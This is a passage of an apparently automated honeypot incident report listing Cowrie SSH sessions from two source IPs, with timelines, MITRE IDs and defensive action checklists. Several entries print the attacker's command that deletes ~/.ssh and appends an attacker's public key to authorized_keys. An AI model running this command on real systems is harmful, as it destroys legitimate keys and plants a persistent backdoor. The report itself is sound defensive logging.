| `2026-04-11 15:04:32` | `cowrie.command.failed` |
| `2026-04-11 15:04:32` | `cowrie.log.closed` |
| `2026-04-11 15:04:32` | `cowrie.session.params` |
| `2026-04-11 15:04:32` | `cowrie.command.input` |
| `2026-04-11 15:04:33` | `cowrie.session.file_download` |
| `2026-04-11 15:04:33` | `cowrie.log.closed` |
| `2026-04-11 15:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e8a8ce7c3d

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:04 |
| **Last Seen** | 2026-04-11 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:04:35` | `cowrie.session.connect` |
| `2026-04-11 15:04:35` | `cowrie.client.version` |
| `2026-04-11 15:04:35` | `cowrie.client.kex` |
| `2026-04-11 15:04:36` | `cowrie.login.success` |
| `2026-04-11 15:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-286965d1dce1

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:07 |
| **Last Seen** | 2026-04-11 15:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:07:44` | `cowrie.session.connect` |
| `2026-04-11 15:07:44` | `cowrie.client.version` |
| `2026-04-11 15:07:44` | `cowrie.client.kex` |
| `2026-04-11 15:07:45` | `cowrie.login.success` |
| `2026-04-11 15:07:45` | `cowrie.session.params` |
| `2026-04-11 15:07:45` | `cowrie.command.input` |
| `2026-04-11 15:07:45` | `cowrie.command.failed` |
| `2026-04-11 15:07:45` | `cowrie.log.closed` |
| `2026-04-11 15:07:46` | `cowrie.session.params` |
| `2026-04-11 15:07:46` | `cowrie.command.input` |
| `2026-04-11 15:07:46` | `cowrie.session.file_download` |
| `2026-04-11 15:07:46` | `cowrie.log.closed` |
| `2026-04-11 15:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f98d028a901e

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:07 |
| **Last Seen** | 2026-04-11 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:07:48` | `cowrie.session.connect` |
| `2026-04-11 15:07:48` | `cowrie.client.version` |
| `2026-04-11 15:07:48` | `cowrie.client.kex` |
| `2026-04-11 15:07:49` | `cowrie.login.success` |
| `2026-04-11 15:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4581770de7c3

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:09 |
| **Last Seen** | 2026-04-11 15:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:09:15` | `cowrie.session.connect` |
| `2026-04-11 15:09:15` | `cowrie.client.version` |
| `2026-04-11 15:09:16` | `cowrie.client.kex` |
| `2026-04-11 15:09:16` | `cowrie.login.success` |
| `2026-04-11 15:09:17` | `cowrie.session.params` |
| `2026-04-11 15:09:17` | `cowrie.command.input` |
| `2026-04-11 15:09:17` | `cowrie.command.failed` |
| `2026-04-11 15:09:17` | `cowrie.log.closed` |
| `2026-04-11 15:09:17` | `cowrie.session.params` |
| `2026-04-11 15:09:17` | `cowrie.command.input` |
| `2026-04-11 15:09:17` | `cowrie.session.file_download` |
| `2026-04-11 15:09:17` | `cowrie.log.closed` |
| `2026-04-11 15:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d6164076e37

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:09 |
| **Last Seen** | 2026-04-11 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:09:20` | `cowrie.session.connect` |
| `2026-04-11 15:09:20` | `cowrie.client.version` |
| `2026-04-11 15:09:20` | `cowrie.client.kex` |
| `2026-04-11 15:09:21` | `cowrie.login.success` |
| `2026-04-11 15:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52159e2660c2

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:12 |
| **Last Seen** | 2026-04-11 15:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:12:13` | `cowrie.session.connect` |
| `2026-04-11 15:12:13` | `cowrie.client.version` |
| `2026-04-11 15:12:13` | `cowrie.client.kex` |
| `2026-04-11 15:12:14` | `cowrie.login.success` |
| `2026-04-11 15:12:14` | `cowrie.session.params` |
| `2026-04-11 15:12:14` | `cowrie.command.input` |
| `2026-04-11 15:12:14` | `cowrie.command.failed` |
| `2026-04-11 15:12:14` | `cowrie.log.closed` |
| `2026-04-11 15:12:15` | `cowrie.session.params` |
| `2026-04-11 15:12:15` | `cowrie.command.input` |
| `2026-04-11 15:12:15` | `cowrie.session.file_download` |
| `2026-04-11 15:12:15` | `cowrie.log.closed` |
| `2026-04-11 15:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2a5ebabd7e6

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 15:12 |
| **Last Seen** | 2026-04-11 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:12:17` | `cowrie.session.connect` |
| `2026-04-11 15:12:17` | `cowrie.client.version` |
| `2026-04-11 15:12:17` | `cowrie.client.kex` |
| `2026-04-11 15:12:18` | `cowrie.login.success` |
| `2026-04-11 15:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-432a7e1a3d84

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 15:50 |
| **Last Seen** | 2026-04-11 15:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:50:20` | `cowrie.session.connect` |
| `2026-04-11 15:50:20` | `cowrie.client.version` |
| `2026-04-11 15:50:20` | `cowrie.client.kex` |
| `2026-04-11 15:50:21` | `cowrie.login.success` |
| `2026-04-11 15:50:21` | `cowrie.session.params` |
| `2026-04-11 15:50:21` | `cowrie.command.input` |
| `2026-04-11 15:50:21` | `cowrie.command.failed` |
| `2026-04-11 15:50:21` | `cowrie.log.closed` |
| `2026-04-11 15:50:21` | `cowrie.session.params` |
| `2026-04-11 15:50:21` | `cowrie.command.input` |
| `2026-04-11 15:50:22` | `cowrie.session.file_download` |
| `2026-04-11 15:50:22` | `cowrie.log.closed` |
| `2026-04-11 15:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130f284a6bfd

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 15:50 |
| **Last Seen** | 2026-04-11 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:50:24` | `cowrie.session.connect` |
| `2026-04-11 15:50:24` | `cowrie.client.version` |
| `2026-04-11 15:50:24` | `cowrie.client.kex` |
| `2026-04-11 15:50:24` | `cowrie.login.success` |
| `2026-04-11 15:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31aa7f2cb7dc

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 15:52 |
| **Last Seen** | 2026-04-11 15:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:52:03` | `cowrie.session.connect` |
| `2026-04-11 15:52:03` | `cowrie.client.version` |
| `2026-04-11 15:52:03` | `cowrie.client.kex` |
| `2026-04-11 15:52:04` | `cowrie.login.success` |
| `2026-04-11 15:52:04` | `cowrie.session.params` |
| `2026-04-11 15:52:04` | `cowrie.command.input` |
| `2026-04-11 15:52:04` | `cowrie.command.failed` |
| `2026-04-11 15:52:04` | `cowrie.log.closed` |
| `2026-04-11 15:52:05` | `cowrie.session.params` |
| `2026-04-11 15:52:05` | `cowrie.command.input` |
| `2026-04-11 15:52:05` | `cowrie.session.file_download` |
| `2026-04-11 15:52:05` | `cowrie.log.closed` |
| `2026-04-11 15:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ef4b98fd61

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 15:52 |
| **Last Seen** | 2026-04-11 15:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:52:07` | `cowrie.session.connect` |
| `2026-04-11 15:52:07` | `cowrie.client.version` |
| `2026-04-11 15:52:07` | `cowrie.client.kex` |
| `2026-04-11 15:52:08` | `cowrie.login.success` |
| `2026-04-11 15:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cadc7104c6b

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 15:58 |
| **Last Seen** | 2026-04-11 15:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:58:41` | `cowrie.session.connect` |
| `2026-04-11 15:58:41` | `cowrie.client.version` |
| `2026-04-11 15:58:41` | `cowrie.client.kex` |
| `2026-04-11 15:58:42` | `cowrie.login.success` |
| `2026-04-11 15:58:42` | `cowrie.session.params` |
| `2026-04-11 15:58:42` | `cowrie.command.input` |
| `2026-04-11 15:58:42` | `cowrie.command.failed` |
| `2026-04-11 15:58:42` | `cowrie.log.closed` |
| `2026-04-11 15:58:42` | `cowrie.session.params` |
| `2026-04-11 15:58:42` | `cowrie.command.input` |
| `2026-04-11 15:58:42` | `cowrie.session.file_download` |
| `2026-04-11 15:58:42` | `cowrie.log.closed` |
| `2026-04-11 15:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b82e79d670

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 15:58 |
| **Last Seen** | 2026-04-11 15:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 15:58:45` | `cowrie.session.connect` |
| `2026-04-11 15:58:45` | `cowrie.client.version` |
| `2026-04-11 15:58:45` | `cowrie.client.kex` |
| `2026-04-11 15:58:45` | `cowrie.login.success` |
| `2026-04-11 15:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9065e15e1511

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:00 |
| **Last Seen** | 2026-04-11 16:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:00:22` | `cowrie.session.connect` |
| `2026-04-11 16:00:22` | `cowrie.client.version` |
| `2026-04-11 16:00:22` | `cowrie.client.kex` |
| `2026-04-11 16:00:23` | `cowrie.login.success` |
| `2026-04-11 16:00:23` | `cowrie.session.params` |
| `2026-04-11 16:00:23` | `cowrie.command.input` |
| `2026-04-11 16:00:23` | `cowrie.command.failed` |
| `2026-04-11 16:00:23` | `cowrie.log.closed` |
| `2026-04-11 16:00:24` | `cowrie.session.params` |
| `2026-04-11 16:00:24` | `cowrie.command.input` |
| `2026-04-11 16:00:24` | `cowrie.session.file_download` |
| `2026-04-11 16:00:24` | `cowrie.log.closed` |
| `2026-04-11 16:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c17c365605

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:00 |
| **Last Seen** | 2026-04-11 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:00:26` | `cowrie.session.connect` |
| `2026-04-11 16:00:26` | `cowrie.client.version` |
| `2026-04-11 16:00:26` | `cowrie.client.kex` |
| `2026-04-11 16:00:27` | `cowrie.login.success` |
| `2026-04-11 16:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e56c46076d

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:02 |
| **Last Seen** | 2026-04-11 16:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:02:02` | `cowrie.session.connect` |
| `2026-04-11 16:02:02` | `cowrie.client.version` |
| `2026-04-11 16:02:02` | `cowrie.client.kex` |
| `2026-04-11 16:02:02` | `cowrie.login.success` |
| `2026-04-11 16:02:03` | `cowrie.session.params` |
| `2026-04-11 16:02:03` | `cowrie.command.input` |
| `2026-04-11 16:02:03` | `cowrie.command.failed` |
| `2026-04-11 16:02:03` | `cowrie.log.closed` |
| `2026-04-11 16:02:03` | `cowrie.session.params` |
| `2026-04-11 16:02:03` | `cowrie.command.input` |
| `2026-04-11 16:02:03` | `cowrie.session.file_download` |
| `2026-04-11 16:02:03` | `cowrie.log.closed` |
| `2026-04-11 16:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-609832b586c2

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:02 |
| **Last Seen** | 2026-04-11 16:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:02:06` | `cowrie.session.connect` |
| `2026-04-11 16:02:06` | `cowrie.client.version` |
| `2026-04-11 16:02:06` | `cowrie.client.kex` |
| `2026-04-11 16:02:06` | `cowrie.login.success` |
| `2026-04-11 16:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542d68ddcc47

